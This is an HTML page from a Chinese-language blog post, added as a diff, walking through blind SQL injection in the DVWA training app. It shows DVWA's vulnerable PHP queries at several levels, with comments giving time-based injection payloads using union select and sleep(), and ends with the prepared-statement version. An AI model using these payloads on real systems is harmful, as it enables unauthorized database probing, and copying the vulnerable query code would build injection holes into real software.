@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=0" />
+<link rel="shortcut icon" href="https://sdttttt.github.io/favicon.ico" />
+<title>Sql Injection Blind | SDTTTTT&#39;s Smelly fish Rotten shrimp 📓</title>
+<meta name="title" content="Sql Injection Blind" />
+<meta name="description" content="返回的结果集无法看到，只能通过一些页面显示或状态来判断。 像瞎子一样。
+DVWA SQL Injection blind 过关秘籍.
+Low if(isset( $_GET[ &#39;Submit&#39; ])) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; // 没有一点点防备 // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效) // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;; // User ID exists in the database. &lt;存在注入漏洞&gt; // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database." />
+<meta name="keywords" content="penetration test," />
+
+
+<meta property="og:title" content="Sql Injection Blind" />
+<meta property="og:description" content="返回的结果集无法看到，只能通过一些页面显示或状态来判断。 像瞎子一样。
+DVWA SQL Injection blind 过关秘籍.
+Low if(isset( $_GET[ &#39;Submit&#39; ])) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; // 没有一点点防备 // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效) // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;; // User ID exists in the database. &lt;存在注入漏洞&gt; // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sdttttt.github.io/blog/sql_injection_blind/" />
+<meta property="og:image" content="https://sdttttt.github.io/static/me.jpg"/>
+<meta property="article:published_time" content="2020-04-10T11:11:22+08:00" />
+<meta property="article:modified_time" content="2020-04-10T11:11:22+08:00" /><meta property="og:site_name" content="SDTTTTT" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://sdttttt.github.io/static/me.jpg"/>
+
+<meta name="twitter:title" content="Sql Injection Blind"/>
+<meta name="twitter:description" content="返回的结果集无法看到，只能通过一些页面显示或状态来判断。 像瞎子一样。
+DVWA SQL Injection blind 过关秘籍.
+Low if(isset( $_GET[ &#39;Submit&#39; ])) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; // 没有一点点防备 // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效) // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;; // User ID exists in the database. &lt;存在注入漏洞&gt; // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database."/>
+
+
+
+<meta itemprop="name" content="Sql Injection Blind">
+<meta itemprop="description" content="返回的结果集无法看到，只能通过一些页面显示或状态来判断。 像瞎子一样。
+DVWA SQL Injection blind 过关秘籍.
+Low if(isset( $_GET[ &#39;Submit&#39; ])) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; // 没有一点点防备 // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效) // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;; // User ID exists in the database. &lt;存在注入漏洞&gt; // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.">
+<meta itemprop="datePublished" content="2020-04-10T11:11:22&#43;08:00" />
+<meta itemprop="dateModified" content="2020-04-10T11:11:22&#43;08:00" />
+<meta itemprop="wordCount" content="543">
+<meta itemprop="image" content="https://sdttttt.github.io/static/me.jpg"/>
+
+
+
+<meta itemprop="keywords" content="penetration test," />
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  body {
+    font-family: Verdana, sans-serif;
+    margin: auto;
+    padding: 20px;
+    max-width: 720px;
+    text-align: left;
+    background-color: white;
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: #444;
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6,
+  strong,
+  b {
+    color: #222;
+  }
+
+  a {
+    color: #3273dc;
+  }
+
+  .title {
+    text-decoration: none;
+    border: 0;
+  }
+
+  .title span {
+    font-weight: 400;
+  }
+
+  nav a {
+    margin-right: 10px;
+  }
+
+  textarea {
+    width: 100%;
+    font-size: 16px;
+  }
+
+  input {
+    font-size: 16px;
+  }
+
+  content {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    padding: 2px 5px;
+    background-color: #eee;
+  }
+
+  pre code {
+    border-left: 1px solid #999;
+    color: #555;
+    display: block;
+    padding: 10px;
+    white-space: pre-wrap;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: #555;
+    padding-left: 10px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px;
+    text-align: center;
+  }
+
+  .helptext {
+    color: #777;
+    font-size: small;
+  }
+
+  .errorlist {
+    color: #eba613;
+    font-size: small;
+  }
+
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>SDTTTTT&#39;s Smelly fish Rotten shrimp 📓</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>Sql Injection Blind</h1>
+<hr />
+<p>
+  <i>
+    <time datetime='2020-04-10' pubdate>
+      10 Apr, 2020
+    </time>
+  </i>
+</p>
+
+
+<content>
+  <p>返回的结果集无法看到，只能通过一些页面显示或状态来判断。
+像瞎子一样。</p>
+<p>DVWA SQL Injection blind 过关秘籍.</p>
+<h3 id="low">Low</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP">if(isset( $_GET[ &#39;Submit&#39; ])) {
+    // Get input
+    $id = $_GET[ &#39;id&#39; ];
+
+    // Check database
+    $getid  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+    // 没有一点点防备
+    // 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效)
+    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,2 # &#39;;
+    // User ID exists in the database. &lt;<span style="color:#f92672">存在注入漏洞</span>&gt;
+    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length( database())=4,sleep(4),2) # &#39;;
+
+    $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors
+
+    // Get results
+    $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors
+    if( $num &gt; 0 ) {
+        // Feedback for end user
+        echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID exists in the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+    }
+    else {
+        // User wasn&#39;t found, so the page wasn&#39;t!
+        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );
+
+        // Feedback for end user
+        echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID is MISSING from the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+    }
+
+    mysql_close();
+}
+</code></pre></div><h3 id="miedum">MIEDUM</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
+    // Get input
+    $id = $_POST[ &#39;id&#39; ];
+    $id = mysql_real_escape_string( $id );
+
+    // Check database
+    $getid  = &#34;SELECT first_name, last_name FROM users WHERE user_id = $id;&#34;;
+    // 尝试构造:
+    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
+    // 以上判断存在注入漏洞
+    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) &gt; 4, sleep(3), 2)
+
+    $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors
+
+    // Get results
+    $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors
+    if( $num &gt; 0 ) {
+        // Feedback for end user
+        echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID exists in the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+    }
+    else {
+        // Feedback for end user
+        echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID is MISSING from the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+    }
+
+    //mysql_close();
+}
+</code></pre></div><h3 id="high">High</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP">if( isset( $_SESSION[&#39;id&#39;])){
+    // Get input
+    $id = $_SESSION[ &#39;id&#39; ];
+
+    // Check database
+    $query  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&#34;;
+    // 没有新花样，只限制输出条目是无法拦住我们的
+    // 尝试构造:
+    // SELECT first_name, last_name FROM users WHERE user_id = &#39;0&#39; union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
+    $result = mysql_query( $query ) or die( &#39;&lt;<span style="color:#f92672">pre</span>&gt;Something went wrong.&lt;/<span style="color:#f92672">pre</span>&gt;&#39; );
+
+    // Get results
+    $num = mysql_numrows( $result );
+    $i   = 0;
+    while( $i <span style="color:#960050;background-color:#1e0010">&lt;</span> $num ) {
+        // Get values
+        $first = mysql_result( $result, $i, &#34;first_name&#34; );
+        $last  = mysql_result( $result, $i, &#34;last_name&#34; );
+
+        // Feedback for end user
+        echo &#34;&lt;<span style="color:#f92672">pre</span>&gt;ID: {$id}&lt;<span style="color:#f92672">br</span> /&gt;First name: {$first}&lt;<span style="color:#f92672">br</span> /&gt;Surname: {$last}&lt;/<span style="color:#f92672">pre</span>&gt;&#34;;
+
+        // Increase loop count
+        $i++;
+    }
+
+    mysql_close();
+}
+</code></pre></div><h3 id="high-1">High</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP">if( isset( $_GET[ &#39;Submit&#39; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+
+    // Get input
+    $id = $_GET[ &#39;id&#39; ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        // PDO 无法注入
+        $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+
+        // Get results
+        if( $data-&gt;rowCount() == 1 ) {
+            // Feedback for end user
+            echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID exists in the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+        }
+        else {
+            // User wasn&#39;t found, so the page wasn&#39;t!
+            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );
+
+            // Feedback for end user
+            echo &#39;&lt;<span style="color:#f92672">pre</span>&gt;User ID is MISSING from the database.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+</code></pre></div>
+</content>
+<p>
+  
+  <a href="https://sdttttt.github.io/tags/penetration-test/">#penetration test</a>
+  
+</p>
+
+  </main>
+  <footer>
+<script async src="https://comments.app/js/widget.js?3" data-comments-app-website="16l5H9Ux" data-limit="5"></script>
+<img src="github.png" /></footer>
+
+    
+</body>
+
+</html>
